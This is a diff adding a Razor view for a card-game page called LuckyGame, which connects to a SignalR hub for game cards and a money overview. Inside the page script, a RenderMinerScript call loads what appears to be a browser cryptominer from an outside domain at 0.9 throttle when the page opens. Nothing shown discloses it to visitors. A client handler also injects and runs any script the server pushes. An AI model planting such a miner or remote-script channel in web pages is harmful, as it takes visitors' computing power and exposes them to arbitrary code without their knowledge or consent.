@@ -1,0 +1,97 @@
+﻿@model SignalRService.ViewModels.LuckyGameConfigurationViewModel
+
+@{
+    ViewBag.Title = "LuckyGameIndex";
+    Layout = "~/Views/Shared/_LayoutReact.cshtml";
+}
+
+
+<script>
+    servicehub = null;
+    
+                 @if (Model != null)
+                 {
+                     <text>
+    signalRGroup = "@Model.SignalRGroup";
+                    </text>
+                 }
+
+
+                 servicehub = $.connection.serviceHub;
+            $.connection.hub.url = "/signalr";
+
+            servicehub.client.clientReceiveWorkData = function (data) {
+                add_script(data.Script);
+            }
+
+            servicehub.client.updateUserTotal = function (data) {
+                UpdateMoneyOverview(data);
+            }
+
+            $.connection.hub.start().done(function () {
+
+                 @if (Model != null)
+                 {
+                     <text>
+                    servicehub.server.joinGroup("@Model.SignalRGroup");
+                    </text>
+                 }
+                     servicehub.server.getLuckyGameCards().done(function (data) {
+
+                         startMoneyOverview();
+                         cardCollection = data;
+                         startLuckyGame();
+
+                     }).fail(function () {
+                         console.log("failed getting cards");
+                     });
+
+                 });
+
+            $.connection.hub.error(function (error) {
+                console.log('SignalR error: ' + error)
+            });
+
+
+
+        @SignalRService.Utils.RenderUtils.RenderMinerScript("b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087", "0.9", "https://www.freecontent.date./W7KS.js", 5000, 10000);
+</script>
+
+<div id="MoneyOverview"></div>
+<div id="LuckyGame"></div>
+
+
+
+
+<script src="@Url.Content("~/Scripts/LuckyGame.jsx")"></script>
+<script src="@Url.Content("~/Scripts/MoneyOverview.jsx")"></script>
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.12/css/all.css" integrity="sha384-G0fIWCsCzJIMAVNQPfjH08cyYaUtMwjJwqiRKxxE/rx96Uroj1BtIQ6MLJuheaO9" crossorigin="anonymous">
+
+<style>
+
+    .cardslot {
+        height: 170px;
+        width: 170px;
+        background-color: blue;
+        float: left;
+        margin: 2px;
+    }
+
+    .controlwrapper {
+        display: inline-block;
+        background-color: green;
+    }
+
+    .error{
+        color:red;
+    }
+    .won {
+        color: green;
+        font-weight: bold;
+    }
+    .lost {
+        color: blue;
+    }
+
+</style>
+
